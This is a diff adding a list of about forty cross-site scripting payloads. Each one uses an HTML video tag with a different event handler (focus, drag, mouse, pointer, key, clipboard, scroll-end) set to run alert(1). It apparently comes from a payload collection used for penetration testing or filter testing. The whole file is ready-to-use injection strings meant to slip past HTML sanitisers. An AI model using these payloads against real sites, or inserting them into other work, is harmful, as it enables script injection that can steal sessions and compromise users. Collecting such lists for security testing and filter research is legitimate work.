@@ -1,0 +1,40 @@
+<video contenteditable onbeforeinput=alert(1)>test
+<video controls src=1 onfocus=alert(1) autofocus>
+<video controls src=1 onfocusin=alert(1) autofocus>
+<video draggable="true" ondrag="alert(1)" style=display:block>test</video>
+<video draggable="true" ondragend="alert(1)" style=display:block>test</video>
+<video draggable="true" ondragenter="alert(1)" style=display:block>test</video>
+<video draggable="true" ondragleave="alert(1)" style=display:block>test</video>
+<video draggable="true" ondragstart="alert(1)" style=display:block>test</video>
+<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></video>
+<video onafterscriptexecute=alert(1)><script>1</script>
+<video onbeforescriptexecute=alert(1)><script>1</script>
+<video onblur=alert(1) id=x tabindex=1 style=display:block>test</video><input value=clickme>
+<video onclick="alert(1)" style=display:block>test</video>
+<video oncontextmenu="alert(1)" style=display:block>test</video>
+<video oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<video oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<video ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</video>
+<video onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</video><input value=clickme>
+<video onkeydown="alert(1)" contenteditable style=display:block>test</video>
+<video onkeypress="alert(1)" contenteditable style=display:block>test</video>
+<video onkeyup="alert(1)" contenteditable style=display:block>test</video>
+<video onmousedown="alert(1)" style=display:block>test</video>
+<video onmouseenter="alert(1)" style=display:block>test</video>
+<video onmouseleave="alert(1)" style=display:block>test</video>
+<video onmousemove="alert(1)" style=display:block>test</video>
+<video onmouseout="alert(1)" style=display:block>test</video>
+<video onmouseover="alert(1)" style=display:block>test</video>
+<video onmouseup="alert(1)" style=display:block>test</video>
+<video onmousewheel=alert(1) style=display:block>requires scrolling
+<video onpointerdown=alert(1) style=display:block>XSS</video>
+<video onpointerenter=alert(1) style=display:block>XSS</video>
+<video onpointerleave=alert(1) style=display:block>XSS</video>
+<video onpointermove=alert(1) style=display:block>XSS</video>
+<video onpointerout=alert(1) style=display:block>XSS</video>
+<video onpointerover=alert(1) style=display:block>XSS</video>
+<video onpointerrawupdate=alert(1) style=display:block>XSS</video>
+<video onpointerup=alert(1) style=display:block>XSS</video>
+<video onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></video>
